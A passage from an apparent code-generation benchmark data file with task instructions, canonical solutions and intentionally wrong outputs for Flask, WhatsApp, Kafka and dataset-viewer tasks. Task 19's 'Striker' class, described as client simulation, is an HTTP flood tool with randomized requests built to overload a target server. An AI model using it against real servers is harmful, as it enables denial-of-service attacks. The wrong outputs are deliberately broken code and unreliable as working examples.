self.api.payload)\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 0\n        self.todos = []\n\n    def get(self, id):\n        for todo in self.todos:\n            if todo[\"id\"] == id:\n                return todo\n        self.api.abort(404, \"Todo {} doesn't exist\".format(id))\n\n    def create(self, data):\n        todo = data\n        todo[\"id\"] = self.counter = self.counter + 1\n        self.todos.append(todo)\n        return todo\n\n    def update(self, id, data):\n        todo = self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id):\n        todo = self.get(id)\n        self.todos.remove(todo)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "class TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.api = Api(self.app)\n        self.ns = Namespace('todos', description='Todo operations')\n        self.api.add_namespace(self.ns)\n        self.todo = self.ns.model('Todo', {\n            'id': fields.Integer(required=True, description='The todo ID'),\n            'title': fields.String(required=True, description='The todo title'),\n            'description': fields.String(description='The todo description'),\n            'completed': fields.Boolean(description='Whether the todo is completed')\n        })\n        self.todo_dao = TodoDAO()\n        self._setup_routes()\n    \n    def _setup_routes(self):\n        self.ns.route(\n            resource='todo',\n            methods=['GET', 'POST']\n        )\n        self.ns.route(\n            resource='todo',\n            methods=['GET', 'POST']\n        )\n        self.ns.route(\n            resource='todo',\n            methods=['PUT', 'DELETE']\n        )\n    \n    def run(self):\n        self.app.run(debug=True)\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 1\n        self.todos = []\n    \n    def get(self, id):\n        todo = next((t for t in self.todos if t['id'] == id), None)\n        if not todo:\n            abort(404, \"Todo not found\")\n        return todo\n    \n    def create(self, data):\n        todo = {\n            'id': self.counter,\n            'title': data['title'],\n            'description': data.get('description', ''),\n            'completed': data.get('completed', False)\n        }\n        self.todos.append(todo)\n        self.counter += 1\n        return todo\n    \n    def update(self, id, data):\n        todo = self.get(id)\n        todo['title'] = data.get('title', todo['title'])\n        todo['description'] = data.get('description', todo['description'])\n        todo['completed'] = data.get('completed', todo['completed'])\n        return todo\n    \n    def delete(self, id):\n        global todos\n        todos = [t for t in todos if t['id'] != id]"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Create a Python class that simulates multiple HTTP clients making concurrent requests to a target server, tracking successful and failed requests, with support for both HTTP and HTTPS protocols.\n\nClass Description: Striker is a Process subclass designed to simulate multiple concurrent HTTP clients. It creates and manages multiple socket connections to a target server, sends randomized HTTP requests, tracks request counts, and handles connection cleanup.\n\nAttributes:\n- counter: [list] - Shared counter for tracking successful and failed requests (index 0 for success, 1 for failures)\n- nr_socks: [int] - Number of concurrent socket connections to maintain\n- runnable: [bool] - Control flag for the main execution loop\n- socks: [list] - List of active socket connections\n- ssl: [bool] - Flag indicating whether to use HTTPS\n- host: [str] - Target server hostname\n- url: [str] - Base URL path for requests\n- port: [int] - Target server port number\n- referers: [list] - List of referer URLs for request randomization\n\nMethods:\n- __init__(url, nr_sockets, counter) -> [None] - Initializes the Striker with target URL, connection count, and shared counter\n- run() -> [None] - Main execution loop that creates connections, sends requests, and processes responses\n- closeConnections() -> [None] - Closes all active socket connections\n- createPayload() -> [tuple] - Generates randomized request payload (URL and headers)\n- generateData() -> [tuple] - Creates request URL with random query string and headers\n- stop() -> [None] - Stops the execution loop and cleans up resources\n- incCounter() -> [None] - Increments the success counter\n- incFailed() -> [None] - Increments the failure counter",
    "Canonical_solution": "from multiprocessing import Process, Manager\nimport urlparse\nimport random\nimport sys\n\nif sys.version_info < (3,0):\n    import httplib\n    HTTPCLIENT = httplib\nelse:\n    import http.client\n    HTTPCLIENT = http.client\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super(Striker, self).__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        \n        parsedUrl = urlparse.urlparse(url)\n        self.ssl = parsedUrl.scheme == 'https'\n        self.host = parsedUrl.netloc.split(':')[0]\n        self.url = parsedUrl.path\n        self.port = parsedUrl.port or (443 if self.ssl else 80)\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://' + self.host + '/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            try:\n                for i in range(self.nr_socks):\n                    if self.ssl:\n                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)\n                    else:\n                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)\n                    self.socks.append(c)\n\n                for conn_req in self.socks:\n                    (url, headers) = self.createPayload()\n                    conn_req.request('GET', url, None, headers)\n\n                for conn_resp in self.socks:\n                    resp = conn_resp.getresponse()\n                    self.incCounter()\n\n                self.closeConnections()\n            except:\n                self.incFailed()\n\n    def closeConnections(self):\n        for conn in self.socks:\n            try:\n                conn.close()\n            except:\n                pass\n\n    def createPayload(self):\n        req_url, headers = self.generateData()\n        random_keys = headers.keys()\n        random.shuffle(random_keys)\n        random_headers = {}\n        for header_name in random_keys:\n            random_headers[header_name] = headers[header_name]\n        return (req_url, random_headers)\n\n    def generateData(self):\n        param_joiner = \"&\" if self.url.count(\"?\") > 0 else \"?\"\n        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))\n        http_headers = self.generateRandomHeaders()\n        return (request_url, http_headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n        self.terminate()\n\n    def incCounter(self):\n        try:\n            self.counter[0] += 1\n        except:\n            pass\n\n    def incFailed(self):\n        try:\n            self.counter[1] += 1\n        except:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import socket\nimport ssl\nimport random\nimport threading\nfrom urllib.parse import urlencode, urlparse, urlunparse\n\nclass Striker(threading.Thread):\n    def __init__(self, url, nr_sockets, counter):\n        super().__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        self.ssl = False\n        self.host = urlparse(url).hostname\n        self.url = url\n        self.port = 80\n        self.referers = [\n            \"https://example.com\",\n            \"http://example.org\",\n            \"https://test.com\",\n            \"http://test.org\",\n            \"https://another.example.net\"\n        ]\n\n    def run(self):\n        while self.runnable:\n            for _ in range(self.nr_socks):\n                if not self.runnable:\n                    break\n                sock = self.create_connection()\n                if sock:\n                    self.socks.append(sock)\n            for sock in self.socks:\n                if not self.runnable:\n                    break\n                payload = self.createPayload()\n                try:\n                    sock.sendall(payload[0])\n                    response = self.receive_response(sock)\n                    if response:\n                        self.incCounter()\n                    else:\n                        self.incFailed()\n                except Exception as e:\n                    self.incFailed()\n                finally:\n                    sock.close()\n                    self.socks.remove(sock)\n\n    def closeConnections(self):\n        for sock in self.socks:\n            sock.close()\n        self.socks.clear()\n\n    def createConnection(self):\n        try:\n            if self.ssl:\n                context = ssl.create_default_context()\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock = context.wrap_socket(sock, server_hostname=self.host)\n                sock.connect((self.host, self.port))\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((self.host, self.port))\n            return sock\n        except Exception as e:\n            return None\n\n    def createPayload(self):\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\",\n            \"Referer\": random.choice(self.referers),\n            \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\"\n        }\n        query_params = {\n            \"rand\": random.randint(1000, 9999),\n            \"time\": int(random.uniform(1, 10)),\n            \"source\": random.choice([\"desktop\", \"mobile\", \"tablet\"])\n        }\n        query_string = urlencode(query_params)\n        full_url = f\"{self.url}?{query_string}\"\n        return (f\"GET {full_url} HTTP/1.1\\r\\n\".encode() + \"\\r\\n\".join(f\"{k}: {v}\" for k, v in headers.items()).encode() + b\"\\r\\n\\r\\n\")\n\n    def receive_response(self, sock):\n        response = b\"\"\n        while True:\n            data = sock.recv(4096)\n            if not data:\n                break\n            response += data\n            if b\"\\r\\n\\r\\n\" in response:\n                break\n        return response\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n\n    def incCounter(self):\n        self.counter[0] += 1\n\n    def incFailed(self):\n        self.counter[1] += 1"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a WhatsApp client class that interacts with the WhatsApp Business API to send text messages to users.\n\nClass Description: The WhatsAppClient class encapsulates functionality for sending text messages through the WhatsApp Business API. It handles authentication, API endpoint construction, and message payload preparation.\n\nAttributes:\nAPI_URL: str - Base URL for the WhatsApp Business API (default: \"https://graph.facebook.com/v17.0/\")\nWHATSAPP_API_TOKEN: str - Temporary access token for authenticating with the WhatsApp API\nWHATSAPP_CLOUD_NUMBER_ID: str - Phone number ID associated with the WhatsApp Business account\nheaders: dict - HTTP headers containing authorization and content type information\n\nMethods:\n__init__: () -> None - Initializes the WhatsAppClient instance by setting up authorization headers and constructing the base API URL\nsend_text_message: (message: str, phone_number: str) -> int - Sends a text message to the specified phone number via WhatsApp API and returns the HTTP status code",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nimport os\nimport requests\nimport json\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    WHATSAPP_API_TOKEN = \"<Temporary access token from your WhatsApp API Setup>\"\n    WHATSAPP_CLOUD_NUMBER_ID = \"<Phone number ID from your WhatsApp API Setup>\"\n\n    def __init__(self):\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        self.API_URL = self.API_URL + self.WHATSAPP_CLOUD_NUMBER_ID\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": 'whatsapp',\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"preview_url\": False,\n                \"body\": message\n            }\n        }\n        response = requests.post(f\"{self.API_URL}/messages\", json=payload, headers=self.headers)\n        print(response.status_code)\n        assert response.status_code == 200, \"Error sending message\"\n        return response.status_code\n\napp = Flask(__name__)\n\n@app.route('/msgrcvd', methods=['POST', 'GET'])\ndef msgrcvd():\n    message = request.args.get('message')\n    answer = llm(message)\n    print(message)\n    print(answer)\n    client.send_text_message(llm(message), \"<your phone number>\")\n    return message + \"<p/>\" + answer",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "class WhatsAppClient:\n    def __init__(self, api_url: str = \"https://graph.facebook.com/v17.0/\", whatsapp_api_token: str = \"\", whatsapp_cloud_number_id: str = \"\"):\n        self.API_URL = api_url\n        self.WHATSAPP_API_TOKEN = whatsapp_api_token\n        self.WHATSAPP_CLOUD_NUMBER_ID = whatsapp_cloud_number_id\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\"\n        }\n\n    def send_text_message(self, message: str, phone_number: str) -> int:\n        url = f\"{self.API_URL}{self.WHATSAPP_CLOUD_NUMBER_ID}/messages\"\n        payload = {\n            \"type\": \"text\",\n            \"text\": {\n                \"body\": message\n            },\n            \"recipient_type\": \"individual\",\n            \"to\": phone_number\n        }\n        import requests\n        response = requests.post(url, json=payload, headers=self.headers)\n        return response.status_code"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Flask-based HTTP server that simulates a RocketMap API endpoint server, capable of generating and returning mock data for gyms and pok\u00e9stops based on geographic coordinates and radius.\n\nFunction Description: The server provides three main endpoints:\n1. Root endpoint ('/') - Returns a simple welcome message\n2. Login endpoint ('/login/<lat>/<lng>/<r>') - Generates and returns gym and pok\u00e9stop data within a specified radius of given coordinates\n3. Scan endpoint ('/scan/<lat>/<lng>') - Returns mock scan data including nearby forts and wild pok\u00e9mons for given coordinates\n\nInput:\n- For root endpoint: None\n- For login endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n  - r: [string] - Radius in meters as string\n- For scan endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n\nOutput:\n- For root endpoint: [string] - Welcome message\n- For login endpoint: [JSON] - List of generated gyms and pok\u00e9stops with their properties\n- For scan endpoint: [JSON] - Mock scan data including cells with forts and wild pok\u00e9mons",
    "Canonical_solution": "from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/')\ndef api_root():\n    return 'This here be a Fake RocketMap API Endpoint Server'\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef api_login(lat, lng, r):\n    global forts\n\n    if len(forts):\n        # already generated\n        return jsonify(forts)\n\n    # coerce types\n    r = int(r)  # radius in meters\n    lat = float(lat)\n    lng = float(lng)\n\n    forts = []\n    area = 3.14 * (r * r)\n\n    # One gym every N sq.m\n    gymCount = int(math.ceil(area / 25000))\n\n    # One pks every N sq.m\n    pksCount = int(math.ceil(area / 15000))\n\n    # Gyms\n    for i in range(gymCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'guard_pokemon_id': randint(1, 140),\n            'gym_points': randint(1, 30000),\n            'id': 'gym-{}'.format(i),\n            'is_in_battle': not getrandbits(1),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'owned_by_team': randint(0, 3)\n        })\n\n    # Pokestops\n    for i in range(pksCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'id': 'pks-{}'.format(i),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'type': 1\n        })\n\n    log.info('Login for location %f,%f generated %d gyms, %d pokestop', lat,\n             lng, gymCount, pksCount)\n    return jsonify(forts)\n\n@app.route('/scan/<lat>/<lng>')\ndef api_scan(lat, lng):\n    location = (float(lat), float(lng))\n    cells = []\n    # for i in range(randint(60,70)):\n    for i in range(3):\n        cells.append({\n            'current_timestamp_ms': int(time() * 1000),\n            'forts': getForts(location),\n            's2_cell_id': uuid4(),  # wrong, but also unused so it\n                                    # doesn't matter\n            'wild_pokemons': makeWildPokemon(location),\n            'catchable_pokemons': [],  # unused\n            'nearby_pokemons': []  # unused\n        })\n    return jsonify({'responses': {'GET_MAP_OBJECTS': {'map_cells': cells}}})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, jsonify\nimport random\nimport math\n\napp = Flask(__name__)\n\ndef generate_gym(lat, lng, r):\n    return {\n        \"type\": \"gym\",\n        \"name\": f\"Gym {random.randint(1, 100)}\",\n        \"lat\": lat + random.uniform(-0.001, 0.001),\n        \"lng\": lng + random.uniform(-0.001, 0.001),\n        \"level\": random.randint(1, 5),\n        \"items\": [f\"Item {i}\" for i in range(1, 4)]\n    }\n\ndef generate_pokestop(lat, lng, r):\n    return {\n        \"type\": \"pokestop\",\n        \"name\": f\"Pokestop {random.randint(1, 100)}\",\n        \"lat\": lat + random.uniform(-0.001, 0.001),\n        \"lng\": lng + random.uniform(-0.001, 0.001),\n        \"items\": [f\"Item {i}\" for i in range(1, 4)]\n    }\n\ndef generate_fort(lat, lng, r):\n    return {\n        \"type\": \"fort\",\n        \"name\": f\"Fort {random.randint(1, 100)}\",\n        \"lat\": lat + random.uniform(-0.001, 0.001),\n        \"lng\": lng + random.uniform(-0.001, 0.001),\n        \"level\": random.randint(1, 5),\n        \"pokemon\": [f\"Pok\u00e9mon {i}\" for i in range(1, 4)]\n    }\n\ndef generate_wild_pokemon(lat, lng, r):\n    return {\n        \"type\": \"wild_pokemon\",\n        \"name\": f\"Wild Pok\u00e9mon {random.randint(1, 100)}\",\n        \"lat\": lat + random.uniform(-0.001, 0.001),\n        \"lng\": lng + random.uniform(-0.001, 0.001),\n        \"level\": random.randint(1, 5)\n    }\n\n@app.route('/')\ndef root():\n    return \"Welcome to RocketMap API!\"\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef login(lat, lng, r):\n    radius = float(r)\n    data = []\n    for _ in range(5):\n        data.append(generate_gym(float(lat), float(lng), radius))\n        data.append(generate_pokestop(float(lat), float(lng), radius))\n    return jsonify(data)\n\n@app.route('/scan/<lat>/<lng>')\ndef scan(lat, lng):\n    cells = []\n    for _ in range(5):\n        cells.append({\n            \"type\": \"cell\",\n            \"id\": f\"cell_{random.randint(1, 100)}\",\n            \"forts\": [generate_fort(float(lat), float(lng), 1000)]\n        })\n        cells.append({\n            \"type\": \"cell\",\n            \"id\": f\"cell_{random.randint(1, 100)}\",\n            \"wild_pokemon\": [generate_wild_pokemon(float(lat), float(lng), 1000)]\n        })\n    return jsonify(cells)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Flask-based HTTP server to visualize and navigate through a robot dataset, allowing users to view different episodes and associated metadata.\n\nFunction Description: The `run_server` function initializes and runs a Flask web server that provides a user interface for exploring robot datasets. It handles dataset navigation, episode selection, and displays relevant information including videos and task descriptions. The server supports both local datasets and remote datasets hosted on Hugging Face.\n\nInput:\n- dataset: Union[LeRobotDataset, IterableNamespace, None] - The dataset to visualize (can be None if loading from URL)\n- episodes: Optional[List[int]] - List of episode IDs to make available (None for all episodes)\n- host: str - Host address to run the server on\n- port: str - Port number to run the server on\n- static_folder: Path - Path to static files directory\n- template_folder: Path - Path to HTML templates directory\n\nOutput: None (runs a Flask server indefinitely until interrupted)\n\nMethods (route handlers):\n1. homepage() -> Union[Redirect, Response] - Handles root URL, redirects to first episode or shows dataset selection page\n2. show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect - Redirects to the first episode of a specified dataset\n3. show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]] - Displays detailed information for a specific episode including videos and task data\n\nThe server provides the following features:\n- Dataset version validation\n- Episode navigation\n- Video playback\n- Task description display\n- Data visualization\n- Support for both local and remote datasets\n- Featured datasets showcase",
    "Canonical_solution": "import argparse\nimport json\nimport logging\nimport re\nimport shutil\nimport tempfile\nfrom pathlib import Path\n\nimport requests\nfrom flask import Flask, redirect, render_template, request, url_for\n\ndef run_server(\n    dataset: LeRobotDataset | IterableNamespace | None,\n    episodes: list[int] | None,\n    host: str,\n    port: str,\n    static_folder: Path,\n    template_folder: Path,\n):\n    app = Flask(__name__, static_folder=static_folder.resolve(), template_folder=template_folder.resolve())\n    app.config[\"SEND_FILE_MAX_AGE_DEFAULT\"] = 0  # specifying not to cache\n\n    @app.route(\"/\")\n    def hommepage(dataset=dataset):\n        if dataset:\n            dataset_namespace, dataset_name = dataset.repo_id.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=0,\n                )\n            )\n\n        dataset_param, episode_param = None, None\n        all_params = request.args\n        if \"dataset\" in all_params:\n            dataset_param = all_params[\"dataset\"]\n        if \"episode\" in all_params:\n            episode_param = int(all_params[\"episode\"])\n\n        if dataset_param:\n            dataset_namespace, dataset_name = dataset_param.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=episode_param if episode_param is not None else 0,\n                )\n            )\n\n        featured_datasets = [\n            \"lerobot/aloha_static_cups_open\",\n            \"lerobot/columbia_cairlab_pusht_real\",\n            \"lerobot/taco_play\",\n        ]\n        return render_template(\n            \"visualize_dataset_homepage.html\",\n            featured_datasets=featured_datasets,\n            lerobot_datasets=available_datasets,\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>\")\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode_id = 0\n        return redirect(\n            url_for(\n                \"show_episode\",\n                dataset_namespace=dataset_namespace,\n                dataset_name=dataset_name,\n                episode_id=first_episode_id,\n            )\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>/episode_<int:episode_id>\")\n    def show_episode(dataset_namespace, dataset_name, episode_id, dataset=dataset, episodes=episodes):\n        repo_id = f\"{dataset_namespace}/{dataset_name}\"\n        try:\n            if dataset is None:\n                dataset = get_dataset_info(repo_id)\n        except FileNotFoundError:\n            return (\n                \"Make sure to convert your LeRobotDataset to v2 & above. See how to convert your dataset at https://github.com/huggingface/lerobot/pull/461\",\n                400,\n            )\n        dataset_version = (\n            dataset.meta._version if isinstance(dataset, LeRobotDataset) else dataset.codebase_version\n        )\n        match = re.search(r\"v(\\d+)\\.\", dataset_version)\n        if match:\n            major_version = int(match.group(1))\n            if major_version < 2:\n                return \"Make sure to convert your LeRobotDataset to v2 & above.\"\n\n        episode_data_csv_str, columns = get_episode_data(dataset, episode_id)\n        dataset_info = {\n            \"repo_id\": f\"{dataset_namespace}/{dataset_name}\",\n            \"num_samples\": dataset.num_frames\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_frames,\n            \"num_episodes\": dataset.num_episodes\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_episodes,\n            \"fps\": dataset.fps,\n        }\n        if isinstance(dataset, LeRobotDataset):\n            video_paths = [\n                dataset.meta.get_video_file_path(episode_id, key) for key in dataset.meta.video_keys\n            ]\n            videos_info = [\n                {\"url\": url_for(\"static\", filename=video_path), \"filename\": video_path.parent.name}\n                for video_path in video_paths\n            ]\n            tasks = dataset.meta.episodes[0][\"tasks\"]\n        else:\n            video_keys = [key for key, ft in dataset.features.items() if ft[\"dtype\"] == \"video\"]\n            videos_info = [\n                {\n                    \"url\": f\"https://huggingface.co/datasets/{repo_id}/resolve/main/\"\n                    + dataset.video_path.format(\n                        episode_chunk=int(episode_id) // dataset.chunks_size,\n                        video_key=video_key,\n                        episode_index=episode_id,\n                    ),\n                    \"filename\": video_key,\n                }\n                for video_key in video_keys\n            ]\n\n            response = requests.get(\n                f\"https://huggingface.co/datasets/{repo_id}/resolve/main/meta/episodes.jsonl\"\n            )\n            response.raise_for_status()\n            # Split into lines and parse each line as JSON\n            tasks_jsonl = [json.loads(line) for line in response.text.splitlines() if line.strip()]\n\n            filtered_tasks_jsonl = [row for row in tasks_jsonl if row[\"episode_index\"] == episode_id]\n            tasks = filtered_tasks_jsonl[0][\"tasks\"]\n\n        videos_info[0][\"language_instruction\"] = tasks\n\n        if episodes is None:\n            episodes = list(\n                range(dataset.num_episodes if isinstance(dataset, LeRobotDataset) else dataset.total_episodes)\n            )\n\n        return render_template(\n            \"visualize_dataset_template.html\",\n            episode_id=episode_id,\n            episodes=episodes,\n            dataset_info=dataset_info,\n            videos_info=videos_info,\n            episode_data_csv_str=episode_data_csv_str,\n            columns=columns,\n        )\n\n    app.run(host=host, port=port)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, redirect, request, render_template, send_from_directory\nimport os\nfrom typing import Union, Optional, List, Tuple, Any\nimport json\nimport time\nimport re\nfrom urllib.parse import unquote, quote\nfrom pathlib import Path\nimport requests\nfrom le_robot_dataset import LeRobotDataset\nfrom huggingface_hub import HfApi, InferenceClient\nfrom functools import lru_cache\n\napp = Flask(__name__, static_folder='static', template_folder='templates')\n\ndef get_dataset_info(dataset: Union[LeRobotDataset, IterableNamespace, None], dataset_name: str, dataset_namespace: str) -> dict:\n    if isinstance(dataset, LeRobotDataset):\n        return {\n            'name': dataset_name,\n            'namespace': dataset_namespace,\n            'version': dataset.version,\n            'num_episodes': len(dataset),\n            'description': dataset.description,\n            'videos': [video for video in dataset.videos.values() if video is not None],\n            'tasks': [task for task in dataset.tasks.values() if task is not None]\n        }\n    elif dataset is not None:\n        return {\n            'name': dataset_name,\n            'namespace': dataset_namespace,\n            'version': dataset.version,\n            'num_episodes': len(dataset),\n            'description': dataset.description,\n            'videos': [video for video in dataset.videos.values() if video is not None],\n            'tasks': [task for task in dataset.tasks.values() if task is not None]\n        }\n    else:\n        return {}\n\ndef validate_dataset_version(dataset: Union[LeRobotDataset, IterableNamespace, None], dataset_name: str, dataset_namespace: str) -> bool:\n    if isinstance(dataset, LeRobotDataset):\n        return dataset.version == dataset._version\n    elif dataset is not None:\n        return dataset.version == dataset._version\n    else:\n        return False\n\ndef get_episode_data(dataset: Union[LeRobotDataset, IterableNamespace, None], episode_id: int) -> dict:\n    if isinstance(dataset, LeRobotDataset):\n        return {\n            'episode_id': episode_id,\n            'video': dataset.videos.get(episode_id),\n            'task': dataset.tasks.get(episode_id),\n            'metadata': dataset.metadata.get(episode_id)\n        }\n    elif dataset is not None:\n        return {\n            'episode_id': episode_id,\n            'video': dataset.videos.get(episode_id),\n            'task': dataset.tasks.get(episode_id),\n            'metadata': dataset.metadata.get(episode_id)\n        }\n    else:\n        return {}\n\ndef get_all_episodes(dataset: Union[LeRobotDataset, IterableNamespace, None]) -> List[int]:\n    if isinstance(dataset, LeRobotDataset):\n        return list(dataset)\n    elif dataset is not None:\n        return list(dataset)\n    else:\n        return []\n\ndef get_dataset_metadata(dataset: Union[LeRobotDataset, IterableNamespace, None]) -> dict:\n    if isinstance(dataset, LeRobotDataset):\n        return dataset.metadata\n    elif dataset is not None:\n        return dataset.metadata\n    else:\n        return {}\n\n@app.route('/')\ndef homepage():\n    dataset = app.config.get('dataset')\n    episodes = app.config.get('episodes')\n    if dataset is not None:\n        if episodes is not None and len(episodes) > 0:\n            return redirect(f'/episode/{dataset.namespace}/{dataset.name}/{episodes[0]}')\n        else:\n            return redirect(f'/select_dataset/{dataset.namespace}/{dataset.name}')\n    else:\n        return redirect('/select_dataset')\n\n@app.route('/select_dataset/<dataset_namespace>/<dataset_name>')\ndef select_dataset(dataset_namespace: str, dataset_name: str):\n    dataset = app.config.get('dataset')\n    if dataset is not None and dataset.namespace == dataset_namespace and dataset.name == dataset_name:\n        return redirect('/')\n    else:\n        return render_template('select_dataset.html', dataset_namespace=dataset_namespace, dataset_name=dataset_name)\n\n@app.route('/episode/<dataset_namespace>/<dataset_name>/<episode_id>')\ndef show_episode(dataset_namespace: str, dataset_name: str, episode_id: int):\n    dataset = app.config.get('dataset')\n    if dataset is not None and dataset.namespace == dataset_namespace and dataset.name == dataset_name:\n        if episodes is not None and episode_id in episodes:\n            episode_data = get_episode_data(dataset, episode_id)\n            return render_template('episode.html', episode_data=episode_data)\n        else:\n            return redirect('/')\n    else:\n        return redirect('/select_dataset')\n\n@app.route('/video/<path:video_path>')\ndef play_video(video_path: str):\n    return send_from_directory(app.config['static_folder'], video_path)\n\n@app.route('/task/<task_id>')\ndef show_task(task_id: str):\n    return render_template('task.html', task_id=task_id)\n\n@app.route('/data/<path:data_path>')\ndef show_data(data_path: str):\n    return send_from_directory(app.config['static_folder'], data_path)\n\n@app.route('/featured_datasets')\ndef featured_datasets():\n    return render_template('featured_datasets.html')\n\n@app.route('/about')\ndef about():\n    return render_template('about.html')\n\ndef run_server(dataset: Union[LeRobotDataset, IterableNamespace, None], episodes: Optional[List[int]], host: str, port: str, static_folder: Path, template_folder: Path):\n    app.config['dataset'] = dataset\n    app.config['episodes'] = episodes\n    app.config['host'] = host\n    app.config['port'] = port\n    app.config['static_folder'] = static_folder\n    app.config['template_folder'] = template_folder\n    app.run(host=host, port=int(port), debug=True)"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Create an asynchronous function that consumes messages from a Kafka topic, processes them in batches, and handles the results using a provided callback function. The function should handle connection retries and gracefully manage the consumer lifecycle.\n\nFunction Description: The function `async_process_streaming_output` asynchronously consumes messages from a specified Kafka topic, processes them in configurable batch sizes, and passes the processed data to a result handler function. It includes retry logic for topic availability and proper consumer startup/shutdown management.\n\nInput:\n- `input_done`: asyncio.Event - Event flag to signal when message consumption should stop\n- `output_topic_name`: str - Name of the Kafka topic to consume messages from\n- `result_handler`: Callable - Function to handle processed message batches\n- `batch_size`: int - Maximum number of records to fetch in each batch\n- `kafka_bootstrap_servers`: str - Comma-separated list of Kafka bootstrap servers\n- `kafka_output_consumer_timeout_ms`: int - Timeout in milliseconds for consumer operations\n\nOutput: None (The function runs continuously until the input_done event is set, processing messages through the result_handler callback)",
    "Canonical_solution": "import asyncio\nimport json\nimport time\nimport traceback\nfrom aiokafka import AIOKafkaConsumer\nfrom aiokafka.errors import UnknownTopicOrPartitionError\n\nasync def async_process_streaming_output(\n    input_done: asyncio.Event,\n    output_topic_name,\n    result_handler,\n    batch_size: int,\n    kafka_bootstrap_servers: str,\n    kafka_output_consumer_timeout_ms: int\n):\n    timeout_ms = kafka_output_consumer_timeout_ms\n\n    # Retry to workaround race condition of topic creation\n    retries = 5\n    while retries > 0:\n        try:\n            consumer = AIOKafkaConsumer(\n                output_topic_name,\n                bootstrap_servers=kafka_bootstrap_servers,\n                value_deserializer=lambda v: json.loads(v.decode(\"utf-8\")),\n                auto_offset_reset=\"earliest\",\n                max_partition_fetch_bytes=3000000,\n            )\n            await consumer.start()\n            break\n        except UnknownTopicOrPartitionError as e:\n            await consumer.stop()\n            retries -= 1\n            time.sleep(1)\n\n    try:\n        while not input_done.is_set():\n            data = await consumer.getmany(timeout_ms=timeout_ms, max_records=batch_size)\n            for topic_partition, messages in data.items():\n                topic = topic_partition.topic\n                if messages:\n                    batches = [msg.value for msg in messages]\n                    for records in batches:\n                        result_handler(records)\n    finally:\n        await consumer.stop()",
    "Code_level": "Function-level",
    "FSMID_for_test": 80,
